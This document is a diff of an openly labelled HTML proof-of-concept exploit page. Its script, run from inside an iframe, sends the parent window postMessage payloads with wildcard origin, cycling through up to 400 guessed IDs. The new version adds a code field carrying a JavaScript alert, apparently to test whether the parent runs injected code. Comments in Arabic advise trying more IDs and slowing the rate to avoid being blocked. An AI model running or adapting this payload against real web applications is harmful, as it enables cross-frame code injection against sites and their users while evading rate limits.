@@ -1,38 +1,30 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Iframe Exploit PoC</title>
-  <meta charset="UTF-8">
-  <style>
-    body { font-family: sans-serif; background: #111; color: #0f0; padding: 20px; }
-  </style>
+  <title>Iframe Attack PoC</title>
 </head>
 <body>
-  <h1>📤 Sending payload to parent window...</h1>
-  <p>Check devtools console.</p>
-
+  <h3>📤 Sending payload to parent window...</h3>
   <script>
-    let currentID = 1;
-    const MAX_ID = 100; // Adjust as needed
-
-    const payload = (id) => ({
-      type: "execute",
+    const payloadTemplate = (id) => ({
+      type: "render",
       id: id,
-      // You can add more keys depending on expected structure
+      code: "alert(`🔥 Code Executed! ID = ${id}`)"
     });
 
-    const interval = setInterval(() => {
-      if (currentID > MAX_ID) {
-        clearInterval(interval);
-        console.log("✅ Done sending all payloads.");
-        return;
-      }
+    let id = 1;
+    const MAX_ID = 400; // جرّب أكثر إذا لزم
 
-      const msg = payload(currentID);
-      console.log("📤 Sending payload with ID:", currentID);
-      parent.postMessage(msg, "*"); // No need for a reply
-      currentID++;
-    }, 500); // 500ms delay to avoid flooding
+    const send = () => {
+      if (id > MAX_ID) return;
+      const payload = payloadTemplate(id);
+      console.log("Trying ID: ", id);
+      parent.postMessage(payload, "*");
+      id++;
+      setTimeout(send, 100); // خفف السرعة لتجنب الحظر
+    };
+
+    send();
   </script>
 </body>
 </html>
